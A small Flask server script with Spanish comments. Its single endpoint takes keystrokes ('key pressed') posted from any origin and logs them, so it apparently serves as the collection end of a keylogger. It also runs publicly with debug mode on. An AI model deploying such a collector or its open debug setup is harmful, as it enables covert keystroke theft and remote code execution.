from flask import Flask, request, jsonify
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)  # Habilita CORS para permitir solicitudes desde cualquier origen

@app.route('/log', methods=['POST'])
def recibir_log():
    try:
        # Verificar si la solicitud tiene contenido JSON válido
        data = request.get_json()
        print(f" Datos recibidos en el servidor: {data}")  # Mostrar los datos completos recibidos
        if not data:
            return jsonify({"error": "Solicitud inválida, se esperaba JSON"}), 400
        
        # Extraer la tecla presionada
        key_pressed = data.get("key")
        if key_pressed is None:
            return jsonify({"error": "Falta la clave 'key' en el JSON"}), 400

        print(f" Tecla presionada recibida: {key_pressed}")  # Log en consola para depuración
        
        return jsonify({"status": "recibido", "key": key_pressed}), 200

    except Exception as e:
        print(f" Error en /log: {str(e)}")  # Log de errores en consola
        return jsonify({"error": "Error interno del servidor", "details": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))  # Permite definir el puerto en variable de entorno
    print(f" Servidor corriendo en http://0.0.0.0:{port}")  # Mensaje al iniciar
    app.run(host='0.0.0.0', port=port, debug=True)  # Habilita modo debug para mejor depuración

